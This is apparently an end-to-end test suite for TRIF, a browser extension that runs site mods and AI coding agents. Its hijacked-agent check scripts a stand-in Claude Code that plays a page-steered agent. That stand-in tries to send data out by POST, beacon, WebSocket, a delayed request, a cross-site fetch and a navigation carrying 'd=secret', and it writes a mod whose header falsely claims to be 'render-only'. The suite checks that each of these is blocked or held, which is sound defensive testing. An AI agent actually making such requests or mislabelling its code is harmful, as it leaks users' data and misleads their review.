      const o = await waitFor('the mods ran', async () => { const x = JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `({ free: document.documentElement.getAttribute('data-spec-free'), boxed: document.documentElement.getAttribute('data-trif-box-spec') || document.documentElement.getAttribute('data-trif-spec') })`], { timeoutMs: 20000 })).stdout); return x.free && x.boxed ? x : null; }, { timeoutMs: 15000, intervalMs: 400 });
      await sleep(3000);
      const reqs = this.o.servers.requests.slice(n0).map((q) => q.url);
      const free = reqs.some((u) => u.startsWith('/e2e-spec-free/')), boxed = reqs.some((u) => u.startsWith('/e2e-spec-boxed/'));
      const res = { browser: this.o.browser, freeLinkFetchedWithoutClick: free, boxedLink: o.boxed, boxedLinkFetchedWithoutClick: boxed };
      fs.writeFileSync(this.r.file(`specrules-${this.o.browser}.json`), JSON.stringify(res, null, 2));
      if (boxed) throw new Error(`a boxed mod's link was fetched without a click: ${JSON.stringify(res)}`);
      if (!/^refused: .*\| copy made$/.test(o.boxed)) throw new Error(`the sandboxed mod: ${o.boxed}`);
      return `free mod's link fetched without a click: ${free ? 'yes' : 'no'} (${this.o.browser}); sandboxed mod: ${o.boxed}`;
    } finally {
      for (const id of Object.keys(files)) { try { fs.unlinkSync(path.join(dir, `${id}.js`)); } catch { /* gone */ } }
    }
  }

  async sandboxedPanelCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const file = path.join(dir, 'e2e-sbx-panel.js');
    const ext = (await this.cli(['status'], { json: true, timeoutMs: 20000 })).json.extension;
    if (ext.sandbox === false) return { status: 'skip', detail: `${this.d.name} has no sandbox: its sandboxed mods are page scripts there (sandboxFallbackCheck)` };
    const look = async () => (await this.cli(['run', '--tab', String(win.tabId), `document.documentElement.getAttribute('data-trif-box-sbx-panel')`], { timeoutMs: 20000 })).stdout.trim();
    const clickGroup = async () => {
      await waitFor('the Sandboxed heading', () => this.panel(`async () => !!document.querySelector('li.mod-group[data-group="sandboxed"] .group-switch') || null`), { timeoutMs: 10000 });
      await this.panelClick('li.mod-group[data-group="sandboxed"] .group-switch');
    };
    try {
      fs.writeFileSync(file, '// ==WebMod==\n// @name E2E Sandboxed in the panel\n// @match *://127.0.0.1/*\n// @sandboxed\n// ==/WebMod==\npage.root.setAttr(\'data-trif-box-sbx-panel\', \'ran\');\n');
      await waitFor('it registered', async () => /e2e-sbx-panel\s+registered \(boxed\)/.test((await this.cli(['status'], { timeoutMs: 20000 })).stdout) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=sandboxed-panel`]);
      await waitFor('the sandboxed mod running', async () => (/ran/.test(await look()) ? true : null), { timeoutMs: 15000, intervalMs: 400 });
      const layout = await waitFor('the groups in the panel', () => this.panel(`async () => {
        const heads = [...document.querySelectorAll('#mod-list > li.mod-group')].map((li) => li.dataset.group);
        const sb = document.querySelector('li.mod-group[data-group="sandboxed"]');
        const row = document.querySelector('li[data-mod="127.0.0.1/e2e-sbx-panel"]');
        return sb && row && row.querySelector('.light.on') ? { heads, name: sb.querySelector('.mod-group-name').textContent, note: sb.querySelector('.mod-group-note').textContent, rowGroup: row.dataset.group,
          order: [...document.querySelectorAll('#mod-list > li')].map((li) => li.dataset.mod || li.dataset.group),
          starts: [...document.querySelectorAll('.starts-row')].map((l) => l.querySelector('span').textContent + '=' + l.querySelector('select').value) } : null;
      }`), { timeoutMs: 15000 });
      const order = layout.heads.join(',');
      if (!/^(rules,)?sandboxed(,page)?$/.test(order) || layout.name !== 'Boxed mods' || layout.note !== 'Run in TRIF\'s sandbox: they change what the page shows, and can\'t send, load or click anything themselves.' || layout.rowGroup !== 'sandboxed') throw new Error(`the panel: ${JSON.stringify(layout)}`);
      if (layout.order.indexOf('127.0.0.1/e2e-sbx-panel') < layout.order.indexOf('sandboxed') || (layout.order.includes('page') && layout.order.indexOf('127.0.0.1/e2e-sbx-panel') > layout.order.indexOf('page'))) throw new Error(`not under its heading: ${JSON.stringify(layout.order)}`);
      if (JSON.stringify(layout.starts) !== JSON.stringify(['Style mods=on', 'Boxed mods=on', 'Free mods=on'])) throw new Error(`New mods start: ${JSON.stringify(layout.starts)}`);
      await this.shot(this.panelCtx, 'panel-sandboxed-group');
      await clickGroup();
      await waitFor('the sandboxed mod gone from the site', async () => (!/ran/.test(await look()) ? true : null), { timeoutMs: 15000, intervalMs: 400 });
      const st = (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
      if (!/GROUPS OFF\s+boxed mods off on 127\.0\.0\.1/.test(st)) throw new Error(`trif status: ${st.split('\n').find((l) => /GROUPS/.test(l)) || '(no GROUPS OFF line)'}`);
      await clickGroup();
      await waitFor('the sandboxed mod back', async () => (/ran/.test(await look()) ? true : null), { timeoutMs: 15000, intervalMs: 400 });
      return `groups ${order}; "${layout.name}: ${layout.note}"; switched off on 127.0.0.1: it stopped (GROUPS OFF says so); on: back; New mods start: ${layout.starts.join(', ')}`;
    } finally {
      try { fs.unlinkSync(file); } catch { /* gone */ }
      const stillOff = await this.panel(`async () => !!document.querySelector('li.mod-group[data-group="sandboxed"].off')`).catch(() => false);
      if (stillOff) await this.panelClick('li.mod-group[data-group="sandboxed"] .group-switch').catch(() => {});
    }
  }

  // ---- groups (extension/lib.js "Groups"): a group switched off per site, from the panel

  async groupsCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const rulesFile = path.join(this.trif, 'sites', site, 'e2e-group-rules.js');
    const look = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `({ target: document.getElementById('target').textContent, color: getComputedStyle(document.getElementById('title')).color })`], { timeoutMs: 20000 })).stdout);
    const scripts = () => this.ext(`async () => (await chrome.userScripts.getScripts()).map((s) => ({ id: s.id, ex: s.excludeMatches || [] }))`);
    const clickGroup = async () => {
      await waitFor('the Page scripts heading', () => this.panel(`async () => !!document.querySelector('li.mod-group[data-group="page"] .group-switch') || null`), { timeoutMs: 10000 });
      await this.panelClick('li.mod-group[data-group="page"] .group-switch');
    };
    try {
      fs.writeFileSync(rulesFile, '// ==WebMod==\n// @name Group rules\n// @match *://127.0.0.1/*\n// @rules\n// ==/WebMod==\n{ "css": "#title { color: rgb(4, 5, 6) }" }\n');
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=groups`]);
      await waitFor('the rules mod registered', async () => /e2e-group-rules\s+registered/.test((await this.cli(['status'], { timeoutMs: 20000 })).stdout) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      const before = new Map((await scripts()).map((x) => [x.id, x.ex]));
      const on = await waitFor('both mods running', async () => { const x = await look(); return /Changed by the E2E Banner/.test(x.target) && x.color === 'rgb(4, 5, 6)' ? x : null; }, { timeoutMs: 10000, intervalMs: 300 });
      // Page scripts off here, from the panel's heading switch (the tab reloads)
      await clickGroup();
      const off = await waitFor('the page script gone, the rules mod still there', async () => { const x = await look(); return !/Changed by the E2E Banner/.test(x.target) && x.color === 'rgb(4, 5, 6)' ? x : null; }, { timeoutMs: 15000, intervalMs: 400 });
      const reg = await scripts();
      const banner = reg.find((x) => x.id === '127.0.0.1/e2e-banner');
      if (!banner || !banner.ex.includes('*://127.0.0.1/*')) throw new Error(`the page script isn't kept off 127.0.0.1: ${JSON.stringify(banner)}`);
      if (reg.find((x) => x.id === '127.0.0.1/e2e-group-rules')?.ex.includes('*://127.0.0.1/*')) throw new Error('the rules mod was switched off too');
      // other sites' page scripts: left out of 127.0.0.1 only, nothing else changed (they still run on their own sites)
      const site127 = (e) => e === '*://127.0.0.1/*' || e === '*://*.127.0.0.1/*';
      const others = reg.filter((x) => !x.id.startsWith('127.0.0.1/') && before.has(x.id))
        .filter((x) => JSON.stringify(x.ex.filter((e) => !site127(e))) !== JSON.stringify((before.get(x.id) || []).filter((e) => !site127(e))));
      if (others.length) throw new Error(`other mods changed beyond 127.0.0.1: ${JSON.stringify(others)}`);
      const st = (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
      if (!/GROUPS OFF\s+free mods off on 127\.0\.0\.1/.test(st)) throw new Error(`trif status: ${st.split('\n').find((l) => /GROUPS/.test(l)) || '(no GROUPS OFF line)'}`);
      const greyed = await this.panel(`async () => ({ heading: document.querySelector('li.mod-group[data-group="page"]').classList.contains('off'), row: document.querySelector('li[data-mod="127.0.0.1/e2e-banner"]').classList.contains('group-off'), rules: document.querySelector('li[data-mod="127.0.0.1/e2e-group-rules"]').classList.contains('group-off') })`);
      if (!greyed.heading || !greyed.row || greyed.rules) throw new Error(`the panel: ${JSON.stringify(greyed)}`);
      await this.shot(this.panelCtx, 'panel-groups-page-off');
      // on again: back
      await clickGroup();
      await waitFor('the page script back', async () => { const x = await look(); return /Changed by the E2E Banner/.test(x.target) ? x : null; }, { timeoutMs: 15000, intervalMs: 400 });
      return `on: "${on.target}" + ${on.color}; Page scripts off: "${off.target}", rules still ${off.color}, banner excludes 127.0.0.1, other sites' mods untouched, status says so, rows greyed; on again: back`;
    } finally {
      try { fs.unlinkSync(rulesFile); } catch { /* gone */ }
      // (left off by a failure: switch it on again the way the user would)
      const stillOff = await this.panel(`async () => !!document.querySelector('li.mod-group[data-group="page"].off')`).catch(() => false);
      if (stillOff) await this.panelClick('li.mod-group[data-group="page"] .group-switch').catch(() => {});
    }
  }

  // ---- new mods start on or off, by group (Settings; extension/lib.js applyNewMods)

  async startsOffCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const pageFile = path.join(this.trif, 'sites', site, 'e2e-new-page.js');
    const rulesFile = path.join(this.trif, 'sites', site, 'e2e-new-rules.js');
    const look = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `({ ran: document.documentElement.dataset.e2eNewPage || null, color: getComputedStyle(document.getElementById('title')).color })`], { timeoutMs: 20000 })).stdout);
    const setPage = async (value) => {
      await this.panelClick('#settings-btn');
      await waitFor('Settings', () => this.panel(`async () => !document.querySelector('#settings').hidden || null`), { timeoutMs: 5000 });
      // (as the user picking it in the menu: the select's value, then its change event)
      await this.panel(`async (v) => { const s = document.querySelector('#starts-page'); s.value = v; s.dispatchEvent(new Event('change', { bubbles: true })); }`, [value]);
      const want = value === 'off' ? '["page"]' : '[]';
      await waitFor(`page scripts start ${value}`, async () => JSON.stringify((await this.cli(['status'], { json: true, timeoutMs: 20000 })).json.extension.startsOff || []) === want || null, { timeoutMs: 10000, intervalMs: 300 });
      const shown = await this.panel(`async () => ({ rules: document.querySelector('#starts-rules').value, page: document.querySelector('#starts-page').value, note: document.querySelector('#starts-note').hidden ? '' : document.querySelector('#starts-note').textContent })`);
      if (value === 'off') await this.shot(this.panelCtx, 'settings-new-mods-start');
      await this.panelClick('#settings-btn');
      return shown;
    };
    try {
      const shown = await setPage('off');
      if (shown.page !== 'off' || shown.rules !== 'on' || shown.note !== 'Mods your chat here makes still start on.') throw new Error(`Settings shows ${JSON.stringify(shown)}`);
      // A page script and a rules mod appear, written outside the panel (a terminal agent, or by hand). (Seconds
      // after the stand-in runs before this one ended: counted for their run, helper/lib/origins.js, but not as
      // written while it was going, so they still start off.)
      fs.writeFileSync(pageFile, '// ==WebMod==\n// @name New page script\n// @match *://127.0.0.1/*\n// ==/WebMod==\ndocument.documentElement.dataset.e2eNewPage = \'ran\';\n');
      fs.writeFileSync(rulesFile, '// ==WebMod==\n// @name New rules\n// @match *://127.0.0.1/*\n// @rules\n// ==/WebMod==\n{ "css": "#title { color: rgb(7, 8, 9) }" }\n');
      const st = await waitFor('the page script off as new, the rules mod registered', async () => {
        const out = (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
        return /e2e-new-page\s+off \(new: waiting for the user to look at it\)/.test(out) && /e2e-new-rules\s+registered/.test(out) ? out : null;
      }, { timeoutMs: 20000, intervalMs: 500 });
      if (!/^NEW MODS {6}new free mods start off in this browser/m.test(st)) throw new Error(`trif status: ${st.split('\n').find((l) => /NEW MODS/.test(l)) || '(no NEW MODS line)'}`);
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=starts-off`]);
      const off = await waitFor('the rules mod running, not the page script', async () => { const x = await look(); return x.color === 'rgb(7, 8, 9)' ? x : null; }, { timeoutMs: 15000, intervalMs: 400 });
      if (off.ran) throw new Error('the new page script ran');
      const row = await waitFor('its row marked new', () => this.panel(`async () => { const li = document.querySelector('li[data-mod="127.0.0.1/e2e-new-page"]'); const t = li && li.querySelector('.tag'); return t && !t.hidden && t.textContent === 'new' ? { tag: t.textContent, title: t.title, off: li.classList.contains('off') } : null; }`), { timeoutMs: 10000 });
      if (!row.off || row.title !== 'New free mods start off (Settings): switch it on once you\'ve looked at it.') throw new Error(`the row: ${JSON.stringify(row)}`);
      await this.shot(this.panelCtx, 'panel-new-mod-off');
      // The user switches it on in the panel: it runs, and it's no longer "new".
      await this.panelClick('li[data-mod="127.0.0.1/e2e-new-page"] button.switch');
      await waitFor('the page script running', async () => (await look()).ran === 'ran' || null, { timeoutMs: 15000, intervalMs: 400 });
      const after = (await this.cli(['status'], { json: true, timeoutMs: 20000 })).json.extension.mods.find((m) => m.id === '127.0.0.1/e2e-new-page');
      if (after.enabled === false || after.newOff) throw new Error(`after switching on: ${JSON.stringify(after)}`);
      return `Settings: ${JSON.stringify(shown)}; the page script off ("${row.tag}"), the rules mod running (${off.color}); switched on: it runs`;
    } finally {
      for (const f of [pageFile, rulesFile]) { try { fs.unlinkSync(f); } catch { /* gone */ } }
      await setPage('on').catch(() => {});
    }
  }

  // ---- a hijacked agent, with a stand-in Claude Code (extension/tablock.js, helper/lib/powers.js and held.js)

  /**
   * A stand-in `claude` that does what an agent steered by a web page might: from `trif run` in the tab it
   * was given, a POST, a beacon, a WebSocket, a POST put off until after its command is over, and a
   * plain GET (reading is fine); then a mod whose header says render-only but whose code posts. The test
   * site must receive none of the writes, the GET must work, the panel must say the tab is locked, the mod
   * must be held for what its code does; a reload unlocks the tab, and a terminal's `trif run` (the
   * user's own) doesn't lock it.
   */
  async hijackedAgentCheck(win) {
    const dir = path.join(this.work, 'standin-hijack');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'claude'), `#!${process.execPath}
const { spawnSync } = require('child_process');
const fs = require('fs');
const a = process.argv.slice(2);
if (a[0] === '--version') { console.log('2.1.319 (Claude Code)'); process.exit(0); }
if (a[0] === 'auth') { console.log('{"loggedIn": true, "authMethod": "claude.ai"}'); process.exit(0); }
const say = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
say({ type: 'system', subtype: 'init', session_id: 'e2e-hijack' });
process.on('uncaughtException', (e) => { const t = 'stand-in crashed: ' + (e && e.stack || e) + ' cwd=' + process.cwd(); say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text: JSON.stringify({ crash: t }) }] } }); say({ type: 'result', subtype: 'success', is_error: false, result: JSON.stringify({ crash: t }), session_id: 'e2e-hijack' }); process.exit(0); });
const ctxFile = a[a.indexOf('--append-system-prompt-file') + 1];
const ctx = a.includes('--append-system-prompt-file') ? fs.readFileSync(ctxFile, 'utf8') : a.join(' ');
const tab = (/\\(tab (\\d+)\\)/.exec(ctx) || [])[1];
const own = require('path').join(process.cwd(), 'bin', 'trif'); // (the workspace's, as the run's cwd is the workspace)
const trif = fs.existsSync(own) ? own : 'trif';
const run = (code) => {
  const r = spawnSync(trif, ['run', '--tab', tab, '--timeout', '8000', code], { encoding: 'utf8' });
  if (r.error) return 'trif failed: ' + r.error.message;
  if (r.status !== 0) return 'trif failed: ' + String(r.stderr || r.stdout || '').trim();
  try { return JSON.parse(r.stdout); } catch { return r.stdout.trim(); } // (a string result prints as it is)
};
const out = { tab };
out.post = run('fetch("/e2e-post", { method: "POST", body: "hi" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
out.get = run('fetch("/two.html").then((r) => r.status, (e) => "failed: " + e.message)');
out.leak = run('fetch("http://localhost:" + location.port + "/e2e-leak?d=secret").then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
out.beacon = run('navigator.sendBeacon("/e2e-beacon", "hi")');
out.socket = run('new Promise((res) => { const w = new WebSocket("ws://" + location.host + "/e2e-socket"); w.onopen = () => res("open"); w.onerror = () => res("blocked"); setTimeout(() => res("no answer"), 3000); })');
out.later = run('(setTimeout(() => fetch("/e2e-later", { method: "POST", body: "after the command" }), 1500), "put off")');
fs.writeFileSync('sites/127.0.0.1/e2e-poster.js', '// ==WebMod==\\n// @name Prettier\\n// @description Makes the page prettier\\n// @risk 0 render-only\\n// ==/WebMod==\\n(() => { fetch("/e2e-from-mod", { method: "POST" }); })();\\n');
const text = JSON.stringify(out);
say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text }] } });
say({ type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'e2e-hijack' });
`, { mode: 0o755 });
    const cfgFile = path.join(this.priv, 'config.json');
    const saved = fs.readFileSync(cfgFile, 'utf8');
    const cfg = JSON.parse(saved);
    cfg.env = { ...(cfg.env || {}), PATH: [dir, cfg.env?.PATH].filter(Boolean).join(':') };
    fs.writeFileSync(cfgFile, JSON.stringify(cfg, null, 2) + '\n');
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const posted = (p) => this.o.servers.requests.filter((q) => q.url.startsWith(p) && q.method !== 'GET');
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [`chat:${site}`]);
    const reopen = async () => {
      await this.panel(`async () => { setTimeout(() => location.reload(), 20); return true; }`).catch(() => {});
      await sleep(800);
      this.panelCtx = await this.d.findPage('sidepanel.html');
    };
    const modFile = path.join(this.trif, 'sites', site, 'e2e-poster.js');
    this.hijacked = true; // (the console check expects the requests this blocks)
    try {
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]);
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/?e2e=hijack`]);
      await reopen();
      await this.waitPanel(`the panel on ${site}`, (x) => x.site === site && !x.gate, 15000);
      // (After the expired-login check the panel may still say Claude Code needs a login; Send works anyway.)
      await this.waitLooks('Send on (the stand-in Claude Code)', (l) => /Claude Code/.test(l.dotLabel) && !l.send.disabled, 30000);
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, ['make the page prettier']);
      await this.panelClick('#send');
      const c = await waitFor('the run to finish', async () => { const x = await chat(); return x && !x.run && x.messages.length >= 2 ? x : null; }, { timeoutMs: 60000, intervalMs: 300 });
      const answer = c.messages.find((m) => m.role === 'assistant');
      if (!answer) throw new Error(`the run: ${JSON.stringify(c.messages.map((m) => [m.role, String(m.text).slice(0, 400)]))}`);
      const said = JSON.parse(answer.text);
      if (said.crash) throw new Error(said.crash);
      if (String(said.tab) !== String(win.tabId)) throw new Error(`the stand-in got tab ${said.tab}, not ${win.tabId}: ${JSON.stringify(said)}`);
      if (!/^blocked/.test(said.post)) throw new Error(`the POST: ${said.post}`);
      if (said.get !== 200) throw new Error(`a GET should still work: ${said.get}`);
      if (!/^blocked/.test(said.leak)) throw new Error(`the GET to another site: ${said.leak}`);
      if (said.socket === 'open') throw new Error('the WebSocket opened');
      if (said.later !== 'put off') throw new Error(`the put-off POST: ${said.later}`);
      await sleep(3000); // (past the put-off POST's 1.5 s)
      for (const p of ['/e2e-post', '/e2e-beacon', '/e2e-later', '/e2e-from-mod']) if (posted(p).length) throw new Error(`the test site received ${JSON.stringify(posted(p))}`);
      const leaked = () => this.o.servers.requests.filter((q) => /^\/e2e-(leak|nav)/.test(q.url));
      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
      if (this.o.servers.requests.some((q) => q.url.startsWith('/e2e-socket'))) throw new Error('the WebSocket reached the test site');
      // The panel says so, with a Reload button
      const lock = await waitFor('the lock notice', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden ? n.innerText : null; }`), { timeoutMs: 10000 });
      if (!/Posting is paused on this tab/.test(lock)) throw new Error(`the lock notice: ${lock}`);
      // The mod: held for what its code does, its header's claim shown apart
      const card = await this.approvalFor(`${site}/e2e-poster`);
      const held = { facts: card.items, claim: card.claim };
      if (card.chip !== 'Free mod' || card.lead !== 'TRIF found that this mod:' || !/A free mod can do anything the page can, so look at the code if you're not sure\.$/.test(card.note)) throw new Error(`the approval dialog: ${JSON.stringify(card)}`);
      for (const scheme of ['dark', 'light']) if (await this.d.colorScheme(this.panelCtx, scheme)) { await sleep(150); await this.shot(this.panelCtx, `approval-free-${scheme}`); }
      await this.d.colorScheme(this.panelCtx, '');
      if (!held.facts.some((f) => /send requests or messages from the page as you \(it uses fetch\)/.test(f))) throw new Error(`the held facts: ${JSON.stringify(held)}`);
      if (!/The agent says: .render-only/.test(held.claim)) throw new Error(`the claim: ${held.claim}`);
      await this.shot(this.panelCtx, 'panel-hijack-held-and-locked');
      // Code left in the locked page sending the tab to another site with what it read: blocked (the
      // tab shows the browser's blocked page); the panel's button takes it back to the page it was
      // locked on, a new page: unlocked
      const away = await this.cli(['run', '--tab', String(win.tabId), '(setTimeout(() => { location.href = "http://localhost:" + location.port + "/e2e-nav?d=secret"; }, 100), "sending it away")'], { timeoutMs: 30000 });
      if (away.status !== 0) throw new Error(`trif run: ${away.stderr}`);
      await sleep(2500);
      if (leaked().length) throw new Error(`another site received ${JSON.stringify(leaked())}`);
      await waitFor('the lock notice still up', () => this.panel(`async () => { const n = document.getElementById('tab-lock'); return n && !n.hidden || null; }`), { timeoutMs: 10000 });
      await this.panel(`async () => { document.querySelector('#tab-lock button').click(); return true; }`);
      await waitFor('the tab back on the test site', async () => {
        const t = await this.ext(`async (id) => (await chrome.tabs.get(id)).url`, [win.tabId]);
        return t && t.startsWith(base) ? t : null;
      }, { timeoutMs: 15000 });
      await waitFor('the tab unlocked', () => this.panel(`async () => document.getElementById('tab-lock').hidden || null`), { timeoutMs: 15000 });
      const t = await this.cli(['run', '--tab', String(win.tabId), 'fetch("/e2e-after", { method: "POST", body: "x" }).then((r) => r.status)'], { timeoutMs: 30000 });
      if (t.status !== 0) throw new Error(`trif run from a terminal: ${t.stderr}`);
      await waitFor('the terminal POST to arrive', () => posted('/e2e-after').length || null, { timeoutMs: 5000 });
      if (!(await this.panel(`async () => document.getElementById('tab-lock').hidden`))) throw new Error('a terminal trif run locked the tab');
      // A mod from outside any run (pasted into the folder, as a shared mod would be) that posts: held
      // too, until the user's `trif approve`; then it runs
      const pasted = path.join(this.trif, 'sites', site, 'e2e-pasted.js');
      fs.writeFileSync(pasted, '// ==WebMod==\n// @name Pasted\n// @risk 0 render-only\n// ==/WebMod==\n(() => { document.documentElement.dataset.e2ePasted = "ran"; fetch("/e2e-pasted", { method: "POST" }); })();\n');
      const pastedHeld = await waitFor('the pasted mod held', async () => {
        const st = await this.cli(['status'], { timeoutMs: 20000 });
        return /127\.0\.0\.1\/e2e-pasted\s+HELD: it can send requests/.test(st.stdout) ? st.stdout.split('\n').find((l) => l.includes('e2e-pasted')).trim() : null;
      }, { timeoutMs: 15000, intervalMs: 500 });
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      const ranHeld = await this.cli(['run', '--tab', String(win.tabId), 'document.documentElement.dataset.e2ePasted || "not run"'], { timeoutMs: 20000 });
      if (ranHeld.stdout.trim() !== 'not run' || posted('/e2e-pasted').length) throw new Error(`the held mod ran: ${ranHeld.stdout}`);
      const ok = await this.cli(['approve', `${site}/e2e-pasted`], { timeoutMs: 20000 });
      if (ok.status !== 0) throw new Error(`trif approve: ${ok.stderr}`);
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      await waitFor('the approved mod to run', async () => {
        const r2 = await this.cli(['run', '--tab', String(win.tabId), 'document.documentElement.dataset.e2ePasted || "not run"'], { timeoutMs: 20000 });
        return r2.stdout.trim() === 'ran' || null;
      }, { timeoutMs: 15000, intervalMs: 500 });
      await waitFor('its POST to arrive', () => posted('/e2e-pasted').length || null, { timeoutMs: 5000 });
      fs.unlinkSync(pasted);
      return `POST ${said.post}; GET ${said.get}; GET to another site ${said.leak}; beacon/later/socket/leaving for another site never arrived; mod held: ${held.facts.join(' / ')}; the panel's button brought the tab back, unlocked; a pasted mod that posts: "${pastedHeld}", ran once approved`;
    } finally {
      fs.writeFileSync(cfgFile, saved);
      for (const f of [modFile, path.join(this.trif, 'sites', site, 'e2e-pasted.js')]) { try { fs.unlinkSync(f); } catch { /* not written */ } }
      await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
      await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
    }
  }

  // ---- agent runs (real ones: they use your Claude Code / Codex login and cost a little)

  async agentChecks(agent) {
    const r = this.r;
    const d = this.d;
    const { port } = this.o.servers;
    const base = `http://127.0.0.1:${port}`;
    const sitesDir = path.join(this.trif, 'sites', '127.0.0.1');
    const tccStart = new Date();
    // 'oss': the open-model agent (codex-oss) through OpenRouter, with the key the user saved in the Keychain.
    const agentId = agent === 'oss' ? 'codex-oss' : agent;
    const name = agent === 'claude' ? 'Claude Code' : agent === 'oss' ? 'Open model (OpenRouter)' : 'Codex';
    const model = agent === 'claude' ? (this.o.claudeModel || 'haiku') : agent === 'oss' ? (this.o.ossModel || 'qwen/qwen3-coder') : this.o.codexModel;
    if (agent === 'oss') {
      const set = await this.cli(['agent', 'open-model', '--provider', 'openrouter', '--model', model]);
      if (set.status !== 0) { r.record(`${name}: set up the open model`, 'fail', `${set.stdout}${set.stderr}`); return; }
      // The key: the Keychain item the user saved (the helper runs with the real HOME for agent runs, so it
      // finds the login Keychain; asked here the same way). Only whether there is one: never the key.
      const st = await this.cli(['agent', 'open-model'], { json: true, env: { HOME: REAL_HOME, TRIF_HOME: this.trif, TRIF_PRIVATE: this.priv } });
      if (!st.json || !st.json.hasKey) {
        r.record(`${name}: an OpenRouter key in the Keychain`, 'skip', (st.json && st.json.key && st.json.key.error)
          || 'no OpenRouter key saved: save one in the side panel\'s settings, or run `trif agent open-model --provider openrouter --set-key`, then run --oss again');
        return;
      }
    }

    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.win.tabId, `${base}/?e2e=agent-${agent}`]);
    await this.waitPage('the test page for the agent', (x) => x.url.includes(`agent-${agent}`) && x.banner === 'ran');
    await this.waitPanel('the panel on 127.0.0.1', (x) => x.site === '127.0.0.1' && !x.gate);
    const tabs = (await this.cli(['tabs'], { json: true })).json || [];
    const tab = tabs.find((t) => t.url.includes(`agent-${agent}`));
    if (!tab) { r.record(`${name}: find the test tab`, 'fail', JSON.stringify(tabs)); return; }

    const chatKey = 'chat:127.0.0.1';
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [chatKey]);
    const send = async (text) => {
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [text]);
      await d.click(this.panelCtx, '#send');
    };

    if (agent === 'claude') {
      await r.check(`${name}: panel chat run makes a mod (model ${model})`, async () => {
        await this.ext(`async (agent) => { const { sitePicks = {} } = await chrome.storage.local.get('sitePicks'); sitePicks['127.0.0.1'] = { agent, models: {} }; await chrome.storage.local.set({ sitePicks }); }`, [agent]);
        await send(`/model ${model}`);
        await sleep(1000);
        const before = new Set(fs.readdirSync(sitesDir));
        const n0 = ((await chat()) || { messages: [] }).messages.length;
        await send('Add a mod for this site that shows a bright yellow banner at the very top of the page reading exactly: Hello from the agent. Keep it small.');
        await sleep(2000);
        await this.shot(this.panelCtx, `panel-${agent}-working`);
        const c = await waitFor('the panel run to finish', async () => {
          const x = await chat();
          return x && !x.run && x.messages.length > n0 + 1 ? x : null;
        }, { timeoutMs: 6 * 60000, intervalMs: 2000 });
        await this.shot(this.panelCtx, `panel-${agent}-done`);
        r.log(`chat: ${JSON.stringify(c.messages.slice(n0), null, 2)}`);
        const errors = c.messages.slice(n0).filter((m) => m.role === 'error');
        const added = fs.readdirSync(sitesDir).filter((f) => !before.has(f) && f.endsWith('.js'));
        if (!added.length) throw new Error(`no new mod in sites/127.0.0.1 (chat: ${c.messages.slice(n0).map((m) => `${m.role}: ${String(m.text).slice(0, 200)}`).join(' | ')})`);
        await this.cli(['reload', '--url', 'agent-claude']);
        await this.waitPage('the agent\'s banner on the page', (x) => /Hello from the agent/i.test(x.text), 30000);
        await this.shot(this.pageCtx, `page-${agent}-mod`);
        return `${added.join(', ')}${errors.length ? `; errors in chat: ${errors.map((e) => e.text).join(' | ')}` : ''}`;
      });
    } else {
      await r.check(`${name}: trif agent run makes a mod${model ? ` (model ${model})` : ''}`, async () => {
        // The harness's own mod also rewrites #target; off for this check, so the order the two run in
        // (alphabetical by file name) doesn't decide it.
        await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
        const before = new Set(fs.readdirSync(sitesDir));
        const out = await this.cli(['agent', 'run', '--agent', agentId, '--tab', String(tab.id), ...(model ? ['--model', model] : []),
          'Add a mod for this site that makes the paragraph with id "target" have a thick red border and the text: Codex was here.'], { timeoutMs: 8 * 60000 });
        r.log(`codex run:\n${out.stdout}\n${out.stderr}`);
        const added = fs.readdirSync(sitesDir).filter((f) => !before.has(f) && f.endsWith('.js'));
        if (!added.length) throw new Error(`no new mod (exit ${out.status}): ${(out.stdout + out.stderr).slice(-600)}`);
